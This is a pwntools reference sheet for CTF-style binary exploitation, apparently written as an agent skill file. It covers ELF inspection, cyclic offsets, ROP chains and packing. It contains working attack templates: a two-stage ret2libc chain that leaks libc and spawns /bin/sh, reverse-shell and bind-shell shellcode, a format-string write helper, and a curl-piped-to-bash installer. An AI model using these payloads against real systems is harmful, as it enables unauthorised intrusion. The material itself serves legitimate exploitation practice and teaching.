---
name: pwntools
description: pwntools reference — ELF analysis, ROP chains, shellcraft, process/remote I/O, GDB integration
---

# pwntools Reference

## Installation & Setup

```bash
pip install pwntools
# For GEF (GDB Enhanced Features):
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
# For pwndbg:
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
```

## Core Context

```python
from pwn import *

# Set architecture (auto-detected from ELF)
context.arch = 'amd64'   # x86_64 (64-bit)
context.arch = 'i386'    # x86 (32-bit)
context.arch = 'arm'
context.arch = 'aarch64'

context.os = 'linux'
context.log_level = 'debug'   # verbose
context.log_level = 'error'   # silent
```

## Process & Remote I/O

```python
# Local process
p = process('./target')
p = process(['./target', 'arg1', 'arg2'])

# Remote socket
p = remote('localhost', 4444)
p = remote('ctf.example.com', 31337)

# Send/receive
p.send(b'data')              # send bytes
p.sendline(b'data')          # send + newline
p.sendafter(b'prompt:', b'input')   # wait for prompt then send
p.sendlineafter(b'> ', b'payload')

p.recv(n)                    # receive n bytes
p.recvline()                 # receive until \n
p.recvuntil(b'marker')       # receive until marker
p.recvall()                  # receive until EOF
p.clean(timeout=0.5)         # receive all buffered data

# Interactive shell
p.interactive()
```

## ELF Analysis

```python
e = ELF('./target')
e = ELF('./target', checksec=False)  # skip banner

# Binary info
print(e.arch)      # amd64, i386, arm, ...
print(e.bits)      # 32 or 64
print(e.pie)       # True if PIE
print(e.canary)    # True if stack canary
print(e.nx)        # True if NX/DEP
print(e.relro)     # 'no', 'partial', 'full'

# Symbol addresses
print(hex(e.sym['main']))      # function by name
print(hex(e.sym['win']))
print(hex(e.symbols['flag']))  # same as .sym

# PLT/GOT
print(hex(e.plt['puts']))      # PLT entry for puts
print(hex(e.got['puts']))      # GOT entry for puts (runtime address)

# Sections
print(hex(e.bss()))            # .bss section start

# Search for bytes/strings
addr = next(e.search(b'/bin/sh'))
addr = next(e.search(asm('pop rdi; ret')))

# Entry point
print(hex(e.entry))
```

## Cyclic Patterns (Offset Finding)

```python
# Generate pattern
pattern = cyclic(200)         # 200-byte De Bruijn sequence
pattern = cyclic(200, n=4)    # 4-byte alphabet (for 32-bit)

# Find offset from crash value
offset = cyclic_find(0x61616161)         # from EIP crash (hex)
offset = cyclic_find(b'aaab')            # from bytes at $rsp
offset = cyclic_find(0x6161616161616162) # 64-bit from RIP
```

## ROP Chains

```python
rop = ROP(e)

# Find specific gadgets
rop.find_gadget(['ret'])           # simple ret
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['pop rsi', 'pop r15', 'ret'])  # common pattern

# Auto-build chains for common tasks
rop.call('puts', [e.got['puts']])  # puts(got_puts)
rop.call('system', [next(e.search(b'/bin/sh\x00'))])

# Get the raw bytes
print(rop.dump())      # human-readable
chain = bytes(rop)     # raw bytes to append to payload

# Multiple ELFs (libc + binary)
libc = ELF('./libc.so.6')
rop2 = ROP([e, libc])
```

## Shellcraft (Shellcode Generation)

```python
# Shellcode for current context
sc = shellcraft.sh()             # /bin/sh
sc = shellcraft.sh()
sc = shellcraft.cat('/flag')     # cat /flag

# Reverse shell
sc = shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupsh()

# Bind shell
sc = shellcraft.bindsh(4444, 'ipv4')

# Assemble to bytes
shellcode = asm(sc)
log.info(f'shellcode length: {len(shellcode)} bytes')

# For specific arch:
context.arch = 'i386'
sc = shellcraft.i386.linux.sh()
```

## Packing / Unpacking

```python
# Pack integers to bytes
p64(0xdeadbeef)    # 64-bit little-endian: \xef\xbe\xad\xde\x00\x00\x00\x00
p32(0xdeadbeef)    # 32-bit little-endian
p16(0x1234)        # 16-bit
p8(0x41)           # 8-bit

# Big-endian
p64(0xdeadbeef, endian='big')

# Unpack
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')   # → 0xdeadbeef
u32(b'\xef\xbe\xad\xde')
u64(leaked_bytes.ljust(8, b'\x00'))          # pad if needed

# Flat — build payload from offset→value dict
payload = flat({
    0:     b'A' * 8,     # at offset 0: 8 As
    8:     p64(0x1234),  # at offset 8: address
    1024:  b'flag_here', # at offset 1024
})
```

## Leak-Based Exploitation (ASLR Bypass)

```python
# 1. Leak libc address via plt/got
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

payload1 = flat({
    offset: [
        ret,              # alignment
        pop_rdi, e.got['puts'],
        e.plt['puts'],
        e.sym['main'],    # return to main for stage 2
    ]
})
p.sendlineafter(b'> ', payload1)

# Parse leak
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'puts @ {hex(leak)}')

# Calculate libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# 2. Call system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh\x00'))
payload2 = flat({
    offset: [ret, pop_rdi, bin_sh, libc.sym['system']]
})
p.sendlineafter(b'> ', payload2)
p.interactive()
```

## GDB Integration

```python
# Attach GDB to running process
p = process('./target')
gdb.attach(p, gdbscript='''
    break *main+0x42
    continue
''')

# Or launch directly in GDB
p = gdb.debug('./target', gdbscript='''
    break main
    continue
''')

# Or use pwndbg/GEF externally:
# gdb ./target
# (gdb) pattern create 200
# (gdb) run < input
# (gdb) pattern offset $rip
```

## Format String

```python
# Automatic exploitation
payload = fmtstr_payload(
    offset,           # format string argument offset (found by trial)
    {addr: value},    # dict of address → value to write
    write_size='byte' # 'byte', 'short', 'int' (default byte)
)

# Finding offset manually:
# Send: "AAAA %1$x %2$x %3$x..." until you see 41414141
# That number is your offset
```

## Utility Functions

```python
# Hex conversion
enhex(b'\xde\xad')    # → 'dead'
unhex('deadbeef')     # → b'\xde\xad\xbe\xef'

# Assembly
asm('pop rdi; ret')   # → bytes
disasm(b'\x5f\xc3')   # → 'pop    rdi\nret'

# Logging
log.success('found it: ' + hex(addr))
log.info('trying ' + hex(addr))
log.warning('might not work')

# Cyclic find from GDB crash:
# (gdb) info reg rsp → 0x7ffe...
# (gdb) x/gx $rsp → value at rsp
# cyclic_find(value_at_rsp)  (for 64-bit, grab 8 bytes as little-endian u64)
```
